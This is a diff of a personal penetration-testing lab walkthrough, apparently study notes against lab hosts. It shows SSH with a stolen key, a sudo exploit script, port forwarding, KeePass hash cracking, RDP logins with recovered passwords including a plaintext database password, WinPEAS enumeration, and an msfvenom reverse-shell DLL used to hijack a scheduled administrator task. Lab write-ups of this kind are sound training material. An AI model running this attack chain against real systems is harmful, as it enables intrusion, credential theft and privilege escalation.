@@ -106,7 +106,7 @@ $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
 
 # DEMO
 # Use the same SSH methods like WEB01 on the DEMO
-ssh -i id_edcsa anita@192.168.197.246 -p 2222
+ssh -o StrictHostKeyChecking=no -i anita-id_ecdsa anita@192.168.197.246 -p2222
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 anita@demo:/tmp$ hostname
 demo
@@ -115,9 +115,17 @@ anita@demo:$ cat local.txt
 ...
 [+] [CVE-2021-3156] sudo Baron Samedit
 [+] [CVE-2021-3156] sudo Baron Samedit 2
+
 ...
 
 # Upload the same exploit script from WEB01
+python3 exp_nss.py
+# Unfortunately failed... then probably this machine is not follow to previous methods.
+# We notice that 8000 port is running locally on DEMO, and I think I would like to reverse proxy into my localhost and check
+ssh -o StrictHostKeyChecking=no -N -i anita-id_ecdsa anita@192.168.197.246 -p2222 -L 8000:localhost:8000
+# Access to the http://localhost:8000, nothing much the website can tell.
+# We can further dig into the file.
+
 
 
 
@@ -140,10 +148,10 @@ logs/build/materials/assets/Databases/Database (2).kdbx # Cannot use
 r14_2022/build/DNN/wwwroot/web.config
 ...
 [web.config]
-...
+```
 <!-- Connection String for SQL Server 2008/2012 Express -->
 <add name="SiteSqlServer" connectionString="Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!" providerName="System.Data.SqlClient" />
-...
+```
 # Thats all for now, lets follow to the previous password cracking methods to brute force the Database.kdbx we found
 keepass2john Database.kdbx > keepass.hash
 cat keepass.hash
@@ -168,5 +176,34 @@ sudo apt-get install keepassxc
 # From the port scanning, we knew that RDP port is enable, lets try to find the password access to the Windows
 xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.197.248 +clipboard /cert-ignore
 PS C:\Users\emma\Desktop> cat local.txt
+# Upload winpeas and run [emma-winpeas.md]
+...
+    AppKey: !8@aBRBYdb3!
+    PS history file: C:\Users\emma\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    (Administrator) BetaTask: C:\BetaMonitor\BetaMonitor.exe
+    Trigger: At system startup-After triggered, repeat every 00:01:00 for a duration of 1.00:00:00.
+...
+# Here we get a Appkey, PS history file and taskscheduler with administrator running every 1 minute.
+# I would like to check the BetaMonitor emma permissions
+PS C:\BetaMonitor> icacls .
+. BUILTIN\Users:(OI)(CI)(RX)
+  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+  BUILTIN\Administrators:(OI)(CI)(F)
+  CREATOR OWNER:(OI)(CI)(IO)(F)
+# Emma user couldn't write, but there is a interesting file BetaMonitor.log is exist, and it shows 
+...
+[2022-10-20_05:28:12.2019] Coudln't find BetaLibrary.Dll.
+...
+# We can create a BetaLibrary.Dll file and place it somewhere we can let it perform privilege escalations
+# Lets create a dll file 
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165  LPORT=8888 -f dll -o msf.dll
+# We cannot upload the dll payload to any SYSTEM ENV PATH.. Stuck for a while.. and remember that we found a APPKEY from WinPEAS. Where I think we can try it for mark user
+xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.197.248 /cert-ignore +drive:/home/kali/Desktop,/smb
+# :) Fuck
+PS C:\Users\mark\Desktop> type proof.txt
+# Lets upload the dll payload again to the SYSTEM ENV PATH folder and wait for 1 minutes, named it to BetaLibrary.Dll
+# We have the mark user a.k.a Administrator, thats good for now. We may proceed to another machine now.
+
+
 
 
